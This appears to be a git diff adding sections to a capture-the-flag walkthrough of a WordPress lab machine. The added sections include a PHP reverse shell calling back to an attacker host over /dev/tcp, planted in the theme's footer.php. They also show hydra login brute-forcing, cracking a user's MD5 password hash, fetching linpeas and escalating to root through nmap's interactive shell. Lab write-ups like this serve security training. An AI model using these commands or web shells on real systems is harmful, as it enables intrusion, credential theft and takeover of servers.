@@ -43,7 +43,7 @@ dirb http://$VICTIM:80 /usr/share/wordlists/dirb/big.txt
 
 #### Key 1
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (8).png" alt=""><figcaption></figcaption></figure>
 
 **Downloaded fsocity.dic**
 
@@ -70,7 +70,7 @@ hydra -L fsocity.dic -p test  $VICTIM http-post-form "/wp-login.php:log=^USER^&p
 .10.70.148%2Fwp-admin%2F&testcookie=1:Invalid username" -V -t 30    
 ```
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (8).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -99,10 +99,133 @@ hydra -L Elliot -P fsocity.dic  $VICTIM http-post-form "/wp-login.php:log=^USER^
 10.10.70.148%2Fwp-admin%2F&testcookie=1:is incorrect." -V -t 30 
 ```
 
+<figure><img src="../../.gitbook/assets/image (13) (6).png" alt=""><figcaption></figcaption></figure>
+
+## Reverse Shell
+
+### Reverse Shell Failed Attempt
+
+**revshell.php code**
+
+```
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'");
+?>
+```
+
+**Kali**
+
+```
+vi revshell.php
+zip revshell.zip revshell.php
+nc -lvnp 443
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+
+Connection is made but it isn't stable.
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+
+
+### Reverse Shell&#x20;
+
+wpscan found out that twentyfifeen is installed.
+
+**Kali**
+
+```
+wpscan --url http://$VICTIM
+```
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+nc -vlnp 443
+```
+
+Added the same shell to footer.php which should appear on every page visited. Then I just went back to http://$VICTIM/join and it worked.
+
 <figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+Get autocomplete
 
-<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+**Victim**
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+
+
+**Victim**
+
+```
+cd /home/robot
+ls
+cat password.raw-md5 
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+hashcat -m 0 password.raw-md5 /usr/share/wordlists/rockyou.txt
+hashcat -m 0 password.raw-md5 /usr/share/wordlists/rockyou.txt --show
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+### LinPeas
+
+**Kali**
+
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+cd /tmp/
+wget http://$KALI:81/linpeas.sh
+chmod +x linpeas.sh 
+./linpeas.sh
+```
+
+<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+
+## Privilege Escalation
+
+**Victim**
+
+```
+/usr/local/bin/nmap --interactive
+nmap> !sh
+```
+
+<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
